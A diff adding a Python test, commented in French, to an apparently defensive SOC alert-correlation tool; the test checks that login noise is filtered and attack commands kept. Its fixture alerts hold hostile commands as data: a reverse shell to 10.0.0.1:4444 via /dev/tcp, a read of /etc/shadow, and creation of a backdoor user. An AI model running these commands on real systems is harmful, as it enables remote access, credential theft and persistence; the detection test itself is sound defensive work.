@@ -28,6 +28,40 @@ def _tr(**kw):
     return base
 
 
+def test_section_commandes_ecarte_bruit_session():
+    """Le compte compromis est aussi une session légitime : son bruit de login
+    (gpg-agent, générateurs systemd), séparé de l'attaque par un silence, ne
+    doit PAS apparaître ; seules les commandes rattachées à l'attaque restent."""
+    from datetime import datetime, timedelta, timezone
+    from soc_agent.iris import _section_commandes
+    base = datetime(2026, 7, 25, 14, 0, 0, tzinfo=timezone.utc)
+
+    def al(sec, level, cmd, uid="1001"):
+        hexp = cmd.replace(" ", "\x00").encode().hex()
+        raw = {"full_log": f"proctitle={hexp}", "data": {"audit": {"uid": uid}}}
+        return {"ts": base + timedelta(seconds=sec), "rule_level": level,
+                "rule_id": "80792", "rule_desc": "", "rule_groups": [],
+                "srcip": None, "srcuser": None, "entity": None, "raw": raw}
+
+    alertes = [
+        # Burst d'init de session à t=0..2 (bruit de login sous le même uid).
+        al(0, 3, "/bin/bash /usr/lib/systemd/user-environment-generators/90gpg-agent"),
+        al(1, 3, "gpgconf --list-options gpg-agent"),
+        al(2, 3, "bash -c whoami; id"),
+        # Attaque à t=120+ : alerte HIGH (ancre) puis suite immédiate.
+        al(120, 12, "timeout 3 bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+        al(124, 3, "sudo cat /etc/shadow"),
+        al(130, 3, "sudo useradd -m svcbackup"),
+    ]
+    sec = _section_commandes(alertes)
+    # Attaque présente.
+    assert "svcbackup" in sec and "/etc/shadow" in sec and "dev/tcp" in sec
+    # Bruit écarté : denylist (gpg-agent) ET cluster détaché (whoami, 118 s avant
+    # la première alerte malveillante).
+    assert "gpg-agent" not in sec
+    assert "whoami" not in sec
+
+
 def test_distincts_uids_compromis_differents():
     # Deux chaînes simultanées sur le même hôte (uid 1001 vs uid 33/www-data) :
     # identités fortes disjointes -> incidents DISTINCTS, jamais à fondre.
